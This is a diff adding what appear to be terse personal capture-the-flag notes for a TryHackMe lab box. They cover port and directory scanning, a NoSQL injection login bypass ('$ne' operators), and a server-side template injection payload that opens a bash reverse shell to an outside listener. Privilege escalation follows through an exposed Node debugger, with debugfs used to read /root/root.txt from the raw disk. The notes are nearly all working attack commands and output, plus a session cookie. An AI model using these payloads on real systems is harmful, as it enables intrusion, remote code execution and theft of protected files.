@@ -1,0 +1,87 @@
+day_seven
+
+nmap -sV -sC -p- 10.112.148.34
+ffuf -u http://10.112.148.34/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .js,.json,.txt -mc 200,301,302,403 -t 50
+
+curl -s -i -X POST http://10.112.148.34/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
+
+wiederholen bis staff:role
+
+teste RCE
+
+─$ curl -s -X POST http://10.112.164.241/staff/preview \
+  -H "Cookie: connect.sid=s%3AD79dASAQqzHzB6dKMnQqK9aV0yAtf5zm.6d6Rhb23j8VbnY5vFRKrGweQtFaVuEP8I9VTN9qras8; Path=/; HttpOnly" \ 
+  --data-urlencode "template=<%= 7*7 %>"
+
+nc -lvnp 8008
+
+reverse shell
+└─$ curl -s -X POST http://10.112.164.241/staff/preview \
+  -H "Cookie: connect.sid=s%3AD79dASAQqzHzB6dKMnQqK9aV0yAtf5zm.6d6Rhb23j8VbnY5vFRKrGweQtFaVuEP8I9VTN9qras8" \
+  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('/bin/bash -c \"bash -i >& /dev/tcp/192.168.181.46/8008 0>&1\"').toString() %>"
+
+PRivEsc:
+
+ps aux | grep -i node
+pipelin+ ... /usr/bin/node --inspect=127.0.0.1:9229 processor.js
+
+
+
+poolside@tryhackme-2404:/opt$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+debug> repl
+Press Ctrl+C to leave debug repl
+> process.getuid()
+995
+> process.getgid()
+995
+> process.cwd()
+'/opt/pipelinesvc/telemetry'
+> process.getBuiltinModule('fs').readdirSync('/home/pipelinesvc')
+[ '.bash_logout', '.bashrc', '.profile' ]
+> process.getBuiltinModule('fs').readdirSync('/home/pipelinesvc')
+[ '.bash_logout', '.bashrc', '.profile' ]
+> process.getBuiltinModule('child_process').execSync('id').toString()
+'uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)\n'
+> process.getBuiltinModule('child_process').execSync('sudo -n -l 2>&1 || true').toString()
+'sudo: a password is required\n'
+
+
+ process.getBuiltinModule('child_process').execSync('lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINTS').toString()
+'NAME        FSTYPE     SIZE MOUNTPOINTS\n' +
+  'loop0       squashfs  28.2M /snap/amazon-ssm-agent/13009\n' +
+  'loop1       squashfs  28.4M /snap/amazon-ssm-agent/13349\n' +
+  'loop2       squashfs 105.2M /snap/core/17292\n' +
+  'loop3       squashfs  55.3M /snap/core18/1885\n' +
+  'loop4       squashfs    64M /snap/core20/2379\n' +
+  'loop5       squashfs  74.2M /snap/core22/1621\n' +
+  'loop6       squashfs  63.8M /snap/core20/2866\n' +
+  'loop7       squashfs    74M /snap/core22/2411\n' +
+  'loop8       squashfs  91.9M /snap/lxd/38688\n' +
+  'loop9       squashfs  91.9M /snap/lxd/29619\n' +
+  'nvme1n1                  1G \n' +
+  'nvme0n1                 20G \n' +
+  '└─nvme0n1p1 ext4        20G /\n'
+> process.getBuiltinModule('child_process').execSync("ls -l /dev/sd* /dev/vd* /dev/nvme* /dev/mapper/* 2>/dev/null || true").toString()
+'crw------- 1 root root  10, 236 Aug  2 16:01 /dev/mapper/control\n' +
+  'crw------- 1 root root 241,   0 Aug  2 16:01 /dev/nvme0\n' +
+  'brw-rw---- 1 root disk 259,   1 Aug  2 16:01 /dev/nvme0n1\n' +
+  'brw-rw---- 1 root disk 259,   2 Aug  2 16:01 /dev/nvme0n1p1\n' +
+  'crw------- 1 root root 241,   1 Aug  2 16:01 /dev/nvme1\n' +
+  'brw-rw---- 1 root disk 259,   0 Aug  2 16:01 /dev/nvme1n1\n'
+  
+  
+  process.getBuiltinModule('child_process').execSync(
+  "/usr/sbin/debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>/dev/null"
+).toString()
+
+process.getBuiltinModule('child_process').execFileSync('/usr/sbin/debugfs', ['-R', 'head -7 /root/root.txt', '/dev/nvme0n1p1'], { encoding: 'utf8' })
+
+
+
+
+
+  
+
